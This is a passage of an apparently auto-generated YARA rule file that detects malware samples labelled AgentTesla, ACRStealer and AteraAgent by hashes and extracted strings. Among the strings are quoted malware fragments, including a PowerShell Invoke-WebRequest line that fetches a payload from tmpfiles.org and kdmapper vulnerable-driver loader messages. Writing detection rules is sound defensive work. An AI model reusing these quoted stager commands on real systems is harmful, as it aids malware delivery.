      $x1 = "bapi-ms-win-core-processenvironment-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x2 = "bapi-ms-win-core-processthreads-l1-1-1.dll" fullword ascii /* score: '31.00'*/
      $x3 = "bapi-ms-win-crt-process-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x4 = "bapi-ms-win-core-processthreads-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $s5 = "bapi-ms-win-core-libraryloader-l1-1-0.dll" fullword ascii /* score: '29.00'*/
      $s6 = "bapi-ms-win-core-namedpipe-l1-1-0.dll" fullword ascii /* score: '29.00'*/
      $s7 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '27.00'*/
      $s8 = "bVCRUNTIME140.dll" fullword ascii /* score: '26.00'*/
      $s9 = "VCRUNTIME140.dll" fullword wide /* score: '26.00'*/
      $s10 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '24.00'*/
      $s11 = "bucrtbase.dll" fullword ascii /* score: '23.00'*/
      $s12 = "bapi-ms-win-crt-filesystem-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s13 = "bapi-ms-win-core-rtlsupport-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s14 = "bapi-ms-win-core-errorhandling-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s15 = "9python313.dll" fullword ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 24000KB and pe.imphash() == "a06f302f71edd380da3d5bf4a6d94ebd" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _97b2588f938cb00e2722645865a7fab1ade3b969d8a5e5a0f8ec02d8578632d0_97b2588f_b053ca276617ab5bc7b02fdd0827ac1ad79f9393b27a8bbeb_2 {
   meta:
      description = "_subset_batch - from files 97b2588f938cb00e2722645865a7fab1ade3b969d8a5e5a0f8ec02d8578632d0_97b2588f.exe, b053ca276617ab5bc7b02fdd0827ac1ad79f9393b27a8bbeb00b3b476f0cfdaa_b053ca27.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "97b2588f938cb00e2722645865a7fab1ade3b969d8a5e5a0f8ec02d8578632d0"
      hash2 = "b053ca276617ab5bc7b02fdd0827ac1ad79f9393b27a8bbeb00b3b476f0cfdaa"
   strings:
      $x1 = "pacer: assist ratio=workbuf is not emptybad use of bucket.mpbad use of bucket.bpruntime: double waitpreempt off reason: forcegc:" ascii /* score: '62.00'*/
      $x2 = " runqueue= stopwait= runqsize= gfreecnt= throwing= spinning=atomicand8float64nanfloat32nanException  ptrSize=  targetpc= until p" ascii /* score: '57.00'*/
      $x3 = "reflect: reflect.Value.Elem on an invalid notinheap pointertried to trace goroutine with invalid or unsupported statusreflect: c" ascii /* score: '54.00'*/
      $x4 = "lock: sleeping while lock is availableP has cached GC work at end of mark terminationfailed to acquire lock to start a GC transi" ascii /* score: '53.00'*/
      $x5 = "os/exec.Command(exec: killing Cmdpermission deniedwrong medium typeno data availableexec format errorLookupAccountSidWDnsRecordL" ascii /* score: '50.00'*/
      $x6 = "runtime.newosprocruntime/internal/internal/runtime/thread exhaustionlocked m0 woke upentersyscallblock spinningthreads=gp.waitin" ascii /* score: '50.00'*/
      $x7 = "Invoke-WebRequest 'http://tmpfiles.org/dl/12400880/3601.jpg' -OutFile 'C:\\Users\\Public\\logs.jpg' ;[byte[]] $dwdwdwwasa = (Get" ascii /* score: '50.00'*/
      $x8 = ", locked to threadruntime.semacreateruntime.semawakeupuse of closed filex509negativeserialreflect.Value.IsNilreflect.Value.Float" ascii /* score: '50.00'*/
      $x9 = " (types from different scopes)notetsleep - waitm out of syncfailed to get system page sizeruntime: found in object at *( in prep" ascii /* score: '47.50'*/
      $x10 = "unlock: lock countprogToPointerMask: overflow/gc/cycles/forced:gc-cycles/memory/classes/other:bytes/memory/classes/total:bytesfa" ascii /* score: '46.00'*/
      $x11 = "internal error: polling on unsupported descriptor typeSOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zonesreflect: intern" ascii /* score: '46.00'*/
      $x12 = "suspendG from non-preemptible goroutineruntime: casfrom_Gscanstatus failed gp=stack growth not allowed in system calltraceback: " ascii /* score: '45.00'*/
      $x13 = "lock: lock countbad system huge page sizearena already initialized to unused region of span bytes failed with errno=runtime: Vir" ascii /* score: '44.00'*/
      $x14 = "morebuf={pc:: no frame (sp=runtime: frame ts set in timertraceback stuckruntime.gopanicunexpected kindRegCreateKeyExWRegDeleteVa" ascii /* score: '44.00'*/
      $x15 = ", size = , tail = recover:  not in [ctxt != 0, oldval=, newval= threads=: status= blocked= lockedg=atomicor8 runtime= m->curg=(u" ascii /* score: '44.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _ACRStealer_signature__4b844c48_ACRStealer_signature__d9c666aa_3 {
   meta:
      description = "_subset_batch - from files ACRStealer(signature)_4b844c48.zip, ACRStealer(signature)_d9c666aa.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b844c4850ea6f56c16a147c5aeefdf638efe8fbf4b01feba12ab234d2926761"
      hash2 = "d9c666aaa2e2dd42c5ffffb79d2b31fde5e4293f749fab8b11adfed255bcef1f"
   strings:
      $s1 = "COMSupport.dll" fullword ascii /* score: '29.00'*/
      $s2 = "NLEService.dll" fullword ascii /* score: '26.00'*/
      $s3 = "cdid3.dll" fullword ascii /* score: '23.00'*/
      $s4 = "ExceptionHandler.dll" fullword ascii /* score: '23.00'*/
      $s5 = "DVDSetting.dll" fullword ascii /* score: '23.00'*/
      $s6 = "WSMHook.dll" fullword ascii /* score: '23.00'*/
      $s7 = "NLETransitionMgr.dll" fullword ascii /* score: '23.00'*/
      $s8 = "WSUtilities.dll" fullword ascii /* score: '23.00'*/
      $s9 = "NLEResource.dll" fullword ascii /* score: '23.00'*/
      $s10 = "WsBurn.dll" fullword ascii /* score: '23.00'*/
      $s11 = "WS_Log.dll" fullword ascii /* score: '22.00'*/
      $s12 = "VzFzNzAzI" fullword ascii /* base64 encoded string 'W1s703' */ /* score: '14.00'*/
      $s13 = "DAurora.ini" fullword ascii /* score: '10.00'*/
      $s14 = "rzGEtttW" fullword ascii /* score: '9.00'*/
      $s15 = "LOgFiazo" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x4b50 and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__462a1c4623dd5653cfbabfcb88d6bdd9_imphash__AgentTesla_signature__792661c7a60d6624adab7be57ff57e58_imph_4 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_462a1c4623dd5653cfbabfcb88d6bdd9(imphash).exe, AgentTesla(signature)_792661c7a60d6624adab7be57ff57e58(imphash).exe, AgentTesla(signature)_bb4d11c9.tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e4da512f9f4983b8fe80ba952531414acccd5b037c2c8488055c159c7b88b0c4"
      hash2 = "7d8a20d5f8a916da554fb667337a6f0413dac138a09332d59ebbbb05bc7cfe48"
      hash3 = "bb4d11c9981fbf16b12cf1731ff24da3f0f5127bb363fb9cc55b50d8e977f3b2"
   strings:
      $x1 = "System.Private.TypeLoader, Version=7.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798edFxResources.System.Private.TypeLoad" ascii /* score: '43.00'*/
      $x2 = "System.Private.Reflection.Execution, Version=7.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798exFxResources.System.Privat" ascii /* score: '43.00'*/
      $x3 = "System.Diagnostics.Process, Version=7.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afFxResources.System.Diagnostics.Pro" ascii /* score: '39.00'*/
      $x4 = "vThe EncryptedPrivateKeyInfo structure was decoded but was not successfully interpreted, the password may be incorrect." fullword ascii /* score: '37.00'*/
      $x5 = "System.Diagnostics.Process, Version=7.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afFxResources.System.Diagnostics.Pro" ascii /* score: '36.00'*/
      $x6 = "System.ComponentModel.TypeConverter, Version=7.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3axFxResources.System.Compon" ascii /* score: '34.00'*/
      $x7 = "System.ComponentModel.TypeConverter, Version=7.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3axFxResources.System.Compon" ascii /* score: '34.00'*/
      $x8 = "System.ComponentModel.Primitives, Version=7.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3arFxResources.System.Component" ascii /* score: '34.00'*/
      $x9 = "System.ComponentModel.Primitives, Version=7.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3arFxResources.System.Component" ascii /* score: '34.00'*/
      $x10 = "System.ComponentModel.Design.IDesigner, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword wide /* score: '34.00'*/
      $x11 = "System.Security.Cryptography, Version=7.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajFxResources.System.Security.Cryp" ascii /* score: '31.00'*/
      $x12 = "System.Threading.Tasks.Parallel, Version=7.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3apFxResources.System.Threading." ascii /* score: '31.00'*/
      $x13 = "System.ObjectModel, Version=7.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aVFxResources.System.ObjectModel.SR.resource" ascii /* score: '31.00'*/
      $x14 = "System.Collections, Version=7.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aVFxResources.System.Collections.SR.resource" ascii /* score: '31.00'*/
      $x15 = "System.Collections, Version=7.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aVFxResources.System.Collections.SR.resource" ascii /* score: '31.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x4f50 ) and filesize < 16000KB and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _ACRStealer_signature__587336fb_ACRStealer_signature__f488c196831b4696983c5a865aea58c5_imphash__5 {
   meta:
      description = "_subset_batch - from files ACRStealer(signature)_587336fb.zip, ACRStealer(signature)_f488c196831b4696983c5a865aea58c5(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "587336fb764ff669fdf36ec1043d6cedaf092d49fc8b2f3a7ac90ed37a636690"
      hash2 = "9b064a0d2e8f5c6c75be3aa39939123d56d3f2af7a689b1e912946ba8747edf4"
   strings:
      $x1 = "[LaunchAppCommandsOnLogon][AppCommand::Execute failed][%s][%d][%s][%#08x]" fullword wide /* score: '40.00'*/
      $x2 = "[LaunchAppCommandsOnLogon][AppCommand::Execute][%s]" fullword wide /* score: '37.00'*/
      $x3 = "[DownloadWatchdog][Timed out after %I64u milliseconds (%d rewaits).  Collecting log , locking out downloader type '%s', and TERM" wide /* score: '35.00'*/
      $x4 = "[ConfigManager::GetTempDownloadDir - Temp Dir not a valid path][%s]" fullword wide /* score: '33.00'*/
      $x5 = "[AppCommand::Execute failed][%s][%d][%s][%#08x]" fullword wide /* score: '32.00'*/
      $x6 = "D:\\a\\_work\\1\\omaha\\src\\third_party\\breakpad\\src\\processor\\minidump.cc" fullword ascii /* score: '31.00'*/
      $x7 = "LOG_SYSTEM: ERROR - [::GetFileInformationByHandle failed][%d]" fullword wide /* score: '31.00'*/
      $s8 = "MicrosoftEdgeUpdateComRegisterShell64.exe" fullword wide /* score: '30.00'*/
      $s9 = "MicrosoftEdgeComRegisterShellARM64.exe" fullword wide /* score: '30.00'*/
      $s10 = "[DownloadWatchdog - why didn't this process die?][0x%8x]" fullword wide /* score: '29.00'*/
      $s11 = "[AppCommand::Execute executed][%s][%d][%s][HRESULT=%#08x][PID=%u][exit_code=%u]" fullword wide /* score: '29.00'*/
      $s12 = "[Failed to create process][Mode: %d][0x%08x][Cmdline: %s" fullword wide /* score: '29.00'*/
      $s13 = "[GetDownloaderLockout][%s][0x%08x]" fullword wide /* score: '27.00'*/
      $s14 = "LOG_SYSTEM: [%s]: ERROR - Log path %s has a reparse point" fullword wide /* score: '26.00'*/
      $s15 = "[AppCommand::Execute][LaunchBrowserReplacementAppCommand]" fullword wide /* score: '26.00'*/
   condition:
      ( ( uint16(0) == 0x4b50 or uint16(0) == 0x5a4d ) and filesize < 28000KB and pe.imphash() == "f488c196831b4696983c5a865aea58c5" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _9bc109acfded2eaae2348204bcab5c1c58a913105394336490272545d44507ce_9bc109ac_9cbefe68f395e67356e2a5d8d1b285c0_imphash__6 {
   meta:
      description = "_subset_batch - from files 9bc109acfded2eaae2348204bcab5c1c58a913105394336490272545d44507ce_9bc109ac.elf, 9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9bc109acfded2eaae2348204bcab5c1c58a913105394336490272545d44507ce"
      hash2 = "aa02002f4cdb80fe881ccaad7626f3161e83490b276659ab01879e736f44540f"
   strings:
      $s1 = "net/http.(*http2clientConnReadLoop).processHeaders" fullword ascii /* score: '23.00'*/
      $s2 = "runtime.dumpregs" fullword ascii /* score: '20.00'*/
      $s3 = "processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s4 = "runtime.dumpgstatus" fullword ascii /* score: '20.00'*/
      $s5 = "crypto/tls.(*ecdheKeyAgreement).processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s6 = "crypto/tls.rsaKeyAgreement.processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s7 = "crypto/tls.(*rsaKeyAgreement).processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s8 = "runtime.injectglist.func1" fullword ascii /* score: '20.00'*/
      $s9 = "processClientKeyExchange" fullword ascii /* score: '20.00'*/
      $s10 = "*x509.SystemRootsError" fullword ascii /* score: '19.00'*/
      $s11 = "net/http.(*http2Transport).logf" fullword ascii /* score: '19.00'*/
      $s12 = "crypto/x509.SystemRootsError.Unwrap" fullword ascii /* score: '19.00'*/
      $s13 = "f*func(*tls.Config, *tls.clientHelloMsg, *x509.Certificate) ([]uint8, *tls.clientKeyExchangeMsg, error)" fullword ascii /* score: '19.00'*/
      $s14 = "crypto/x509.SystemRootsError.Error" fullword ascii /* score: '19.00'*/
      $s15 = "net/http.(*http2Framer).logWrite" fullword ascii /* score: '19.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 18000KB and pe.imphash() == "9cbefe68f395e67356e2a5d8d1b285c0" and ( 8 of them )
      ) or ( all of them )
}

rule _AteraAgent_signature__AteraAgent_signature__123ee7b9_7 {
   meta:
      description = "_subset_batch - from files AteraAgent(signature).msi, AteraAgent(signature)_123ee7b9.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "698dbae0f0a37b59c0ba4197135a279511881fe3cffd675feedc5b357b572ec9"
      hash2 = "123ee7b9737081cd149be31fde2cb882b40f126a9c5d208898cc4bb072203759"
   strings:
      $x1 = "que key identifying the binary data.DataThe unformatted binary data.ComponentPrimary key used to identify a particular component" ascii /* score: '82.00'*/
      $x2 = "ecKillAteraTaskQuietKillAteraServicesc delete AteraAgentoldVersionUninstallunins000.exe /VERYSILENTinstall/i /IntegratorLogin=\"" ascii /* score: '37.00'*/
      $x3 = "minPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProductNETFRAMEWORK35NetFramework35AlphaControlAgentInst" ascii /* score: '33.00'*/
      $x4 = "c:\\agent\\_work\\36\\s\\wix\\src\\ext\\ca\\wixca\\dll\\shellexecca.cpp" fullword ascii /* score: '32.00'*/
      $s5 = "c:\\agent\\_work\\36\\s\\wix\\src\\ext\\ca\\wixca\\dll\\serviceconfig.cpp" fullword ascii /* score: '28.00'*/
      $s6 = "AlphaControlAgentInstallation.dll" fullword wide /* score: '28.00'*/
      $s7 = "lrpfxg.exe|AteraAgent.exe1.8.8.107uho0yn3.con|AteraAgent.exe.configfd-i8f6f.dll|ICSharpCode.SharpZipLib.dll1.3.3.11e8lrglzz.dll|" ascii /* score: '27.00'*/
      $s8 = "NSTALLFOLDERAteraAgent.exe.config{0EC8B23C-C723-41E1-9105-4B9C2CDAD47A}ICSharpCode.SharpZipLib.dll{F1B1B9D1-F1B0-420C-9D93-F04E9" ascii /* score: '27.00'*/
      $s9 = "DERID]\" /AccountId=\"[ACCOUNTID]\" /AgentId=\"[AGENTID]\"uninstall/uDeleteTaskSchedulerSCHTASKS.EXE /delete /tn \"Monitoring Re" ascii /* score: '26.00'*/
      $s10 = "c:\\agent\\_work\\36\\s\\wix\\src\\libs\\wcautil\\qtexec.cpp" fullword ascii /* score: '25.00'*/
      $s11 = "c:\\agent\\_work\\36\\s\\wix\\src\\ext\\ca\\wixca\\dll\\xmlconfig.cpp" fullword ascii /* score: '25.00'*/
      $s12 = "STOP AteraAgent\"TaskKill.exe\" /f /im AteraAgent.exeManufacturerAtera networksProductCode{FF8F8E5D-7D92-45F4-AE8D-C06B4DEBE8E2}" ascii /* score: '24.00'*/
      $s13 = "c:\\agent\\_work\\36\\s\\wix\\src\\libs\\wcautil\\wcascript.cpp" fullword ascii /* score: '23.00'*/
      $s14 = "c:\\agent\\_work\\36\\s\\wix\\src\\ext\\ca\\wixca\\dll\\test.cpp" fullword ascii /* score: '22.00'*/
      $s15 = "c:\\agent\\_work\\36\\s\\wix\\src\\ext\\ca\\wixca\\dll\\closeapps.cpp" fullword ascii /* score: '22.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 9000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1d05c32d_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_8 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1d05c32d.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_df66645c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1d05c32d38227623d5fdd3a1d13a82e5a55b015573955de7fb3a4e6ada564031"
      hash2 = "df66645cb25a87f72bdac4ee457e8b22aff036c2c6c2d3f1073088a96ecc1058"
   strings:
      $x1 = "costura.guna.ui2.dll.compressed|2.0.4.7|Guna.UI2, Version=2.0.4.7, Culture=neutral, PublicKeyToken=8b9d14aa5142e261|Guna.UI2.dll" ascii /* score: '43.00'*/
      $x2 = "costura.costura.dll.compressed|6.0.0.0|Costura, Version=6.0.0.0, Culture=neutral, PublicKeyToken=9919ef960d84173d|Costura.dll|02" ascii /* score: '41.00'*/
      $x3 = "costura.costura.dll.compressed|6.0.0.0|Costura, Version=6.0.0.0, Culture=neutral, PublicKeyToken=9919ef960d84173d|Costura.dll|02" ascii /* score: '39.00'*/
      $x4 = "costura.guna.ui2.dll.compressed|2.0.4.7|Guna.UI2, Version=2.0.4.7, Culture=neutral, PublicKeyToken=8b9d14aa5142e261|Guna.UI2.dll" ascii /* score: '37.00'*/
      $x5 = "c:\\users\\cloudbuild\\337244\\sdk\\nal\\src\\winnt_wdm\\driver\\objfre_wnet_AMD64\\amd64\\iqvw64e.pdb" fullword ascii /* score: '34.00'*/
      $x6 = "C:\\Users\\interpreter\\Documents\\Oracl\\kdmapper-master\\x64\\Release\\kdmapper.pdb" fullword ascii /* score: '33.00'*/
      $x7 = "\\SystemRoot\\Strawberry - serial.tmp" fullword wide /* score: '31.00'*/
      $x8 = "[-] Failed to get ntoskrnl.exe" fullword wide /* score: '31.00'*/
      $s9 = "[-] Failed to load driver iqvw64e.sys" fullword wide /* score: '29.00'*/
      $s10 = "[!] Error dumping shit inside the disk" fullword wide /* score: '29.00'*/
      $s11 = "c:\\users\\cloudbuild\\337244\\sdk\\nal\\src\\winnt_wdm\\driver\\windriverpci_i.c" fullword ascii /* score: '27.00'*/
      $s12 = "C:\\!PROGRAMS\\Programming\\Projects\\!Spoofer\\SpooferFN\\x64\\Release\\SpooferFN.pdb" fullword ascii /* score: '27.00'*/
      $s13 = "[-] Failed to load ntdll.dll" fullword wide /* score: '27.00'*/
      $s14 = "_NalWinGetUserAddress: Using memory map table slot %d - Length %d" fullword ascii /* score: '26.00'*/
      $s15 = "[-] Failed to register and start service for the vulnerable driver" fullword wide /* score: '26.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c6fc213b_9 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature).tar, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c6fc213b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e6e06636cd1906375beaff3fea0961a31fed7497ba23e601a32ca7929ee530f2"
      hash2 = "c6fc213b8466645f72bd2b21fe7d8ec9cb98987a82421ce2cbd646eb7f87c08b"
   strings:
      $s1 = "Nfwddzytsiw.exe" fullword wide /* score: '22.00'*/
      $s2 = "ReportVirtualLogger" fullword ascii /* score: '17.00'*/
      $s3 = "ReportConvertibleLogger" fullword ascii /* score: '17.00'*/
      $s4 = "INfwddzytsiw, Version=1.0.2602.10850, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s5 = "Maofyr.Logging" fullword ascii /* score: '16.00'*/
      $s6 = "LoggerDecryptor" fullword ascii /* score: '16.00'*/
      $s7 = "ScanLogger" fullword ascii /* score: '15.00'*/
      $s8 = "FormatLogger" fullword ascii /* score: '14.00'*/
      $s9 = "_SystemParsers" fullword ascii /* score: '14.00'*/
      $s10 = "_SegmentedLoggerItems" fullword ascii /* score: '14.00'*/
      $s11 = "IdentifyLiteralTemplate" fullword ascii /* score: '14.00'*/
      $s12 = "ConverterLogger" fullword ascii /* score: '14.00'*/
      $s13 = "IdentifyCommonSystem" fullword ascii /* score: '13.00'*/
      $s14 = "OperateCentralSystem" fullword ascii /* score: '12.00'*/
      $s15 = "OperateFilteredSystem" fullword ascii /* score: '12.00'*/
   condition:
      ( ( uint16(0) == 0x4f50 or uint16(0) == 0x5a4d ) and filesize < 4000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__8aa17c4c_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2c820503_10 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_8aa17c4c.tar, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2c820503.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8aa17c4c2672f0ff66a8a974133c549bca3f8c61c56d669ae6745aadaa582c8c"
      hash2 = "2c820503a61ed5b8405ecbdac6c2547db6b130a228a8b02647d498a5afd2a1ba"
   strings:
      $s1 = "Zglxh.exe" fullword wide /* score: '22.00'*/
      $s2 = "EncryptStatelessProcessor" fullword ascii /* score: '20.00'*/
      $s3 = "EncryptOperationalConfiguration" fullword ascii /* score: '17.00'*/
      $s4 = "m_ServiceLogger" fullword ascii /* score: '17.00'*/
      $s5 = "EncryptAlphabeticCommand" fullword ascii /* score: '17.00'*/
      $s6 = "EncryptScalableProcessor" fullword ascii /* score: '16.00'*/
      $s7 = "ValidateAttachedExecutor" fullword ascii /* score: '16.00'*/
      $s8 = "ViewExecutor" fullword ascii /* score: '16.00'*/
      $s9 = "EncryptCustomTemplate" fullword ascii /* score: '16.00'*/
      $s10 = "AZglxh, Version=1.0.1193.655, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s11 = "_ExecutorSchemaElements" fullword ascii /* score: '16.00'*/
      $s12 = "flagstemp" fullword ascii /* score: '15.00'*/
      $s13 = "HiddenEncryptor" fullword ascii /* score: '14.00'*/
      $s14 = "ControllableEncryptor" fullword ascii /* score: '14.00'*/
      $s15 = "EncryptOperationalElement" fullword ascii /* score: '14.00'*/
   condition:
      ( ( uint16(0) == 0x3630 or uint16(0) == 0x5a4d ) and filesize < 4000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__719bb222f4bbc8859273f71b5809958a_imphash__AgentTesla_signature__9e1c5e753d9730385056638ab1d72c60_imph_11 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash2 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash3 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                      ' */ /* score: '26.50'*/
      $s2 = "DSystem.Text.RegularExpressions.dll" fullword ascii /* score: '26.00'*/
      $s3 = "hSystem.Runtime.CompilerServices.IStrongBox.get_ValuehSystem.Runtime.CompilerServices.IStrongBox.set_ValueP<InitializeTlsBuckets" ascii /* score: '25.00'*/
      $s4 = "hSystem.Runtime.CompilerServices.IStrongBox.get_ValuehSystem.Runtime.CompilerServices.IStrongBox.set_ValueP<InitializeTlsBuckets" ascii /* score: '25.00'*/
      $s5 = "<SelectAll>d__3R<<ExecuteQueryInto>g__GetResultset|13_0>d" fullword ascii /* score: '23.00'*/
      $s6 = "RestSharp.dll<System.Text.RegularExpressions" fullword ascii /* score: '22.00'*/
      $s7 = ",System.Private.Uri.dll System.Text.Json" fullword ascii /* score: '22.00'*/
      $s8 = "System.Linq.dll*System.Net.Primitives" fullword ascii /* score: '22.00'*/
      $s9 = "&System.Net.Http.dll$System.Collections" fullword ascii /* score: '22.00'*/
      $s10 = "Apache.NMS.ActiveMQ.Commands.ActiveMQObjectMessag" fullword wide /* score: '22.00'*/
      $s11 = "ID: {0} - Position: {1}/{2} - Shared: {3} - ({4}) :: Content: [{5}/{6}" fullword wide /* score: '22.00'*/
      $s12 = "NLog.Targets.FileTarge" fullword wide /* score: '22.00'*/
      $s13 = "System.CodeDom.Compiler.CompilerResult" fullword wide /* score: '22.00'*/
      $s14 = "IsCompatibleKeyDSystem.Collections.IDictionary.AddNSystem.Collections.IDictionary.get_KeysNSystem.Collections.IDictionary.get_It" ascii /* score: '21.00'*/
      $s15 = "IsCompatibleKeyDSystem.Collections.IDictionary.AddNSystem.Collections.IDictionary.get_KeysNSystem.Collections.IDictionary.get_It" ascii /* score: '21.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__34dfcac6_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2c0b057c_12 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_34dfcac6.tar, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2c0b057c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "34dfcac6ae80bbc376cb1fd07e015ff2c49979c8ec485eaf52d47d6f99be2dcf"
      hash2 = "2c0b057cc3615d03cf3c260ebbcc927c0fb08ad47812a41c97c7e1148dcc03ee"
   strings:
      $s1 = "Xftgsooyol.Execution" fullword ascii /* score: '23.00'*/
      $s2 = "Pavmz.exe" fullword wide /* score: '22.00'*/
      $s3 = "ExecuteConfigurableExecutor" fullword ascii /* score: '21.00'*/
      $s4 = "RequestCombinedExecutor" fullword ascii /* score: '19.00'*/
      $s5 = "ScopeExecutor" fullword ascii /* score: '16.00'*/
      $s6 = "CPavmz, Version=1.0.1452.23677, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s7 = "encryptorController" fullword ascii /* score: '14.00'*/
      $s8 = "RequestIdentifiableTemplate" fullword ascii /* score: '14.00'*/
      $s9 = "RunOperationalRunner" fullword ascii /* score: '12.00'*/
      $s10 = "ListenOperationalObserver" fullword ascii /* score: '12.00'*/
      $s11 = "m_CommandDistributor" fullword ascii /* score: '12.00'*/
      $s12 = "Xftgsooyol.DataStructures" fullword ascii /* score: '11.00'*/
      $s13 = "RequestConcreteDecryptor" fullword ascii /* score: '11.00'*/
      $s14 = "RunCentralCompressor" fullword ascii /* score: '10.00'*/
      $s15 = "ListenMixedThread" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x554f or uint16(0) == 0x5a4d ) and filesize < 4000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _a6180d4df916ebaf457bbeefe49f26ef0ba8157ed62487dc27b5707a9fc8a9fe_a6180d4d_ACRStealer_signature__297cfecdeec7600638a2d663ab1_13 {
   meta:
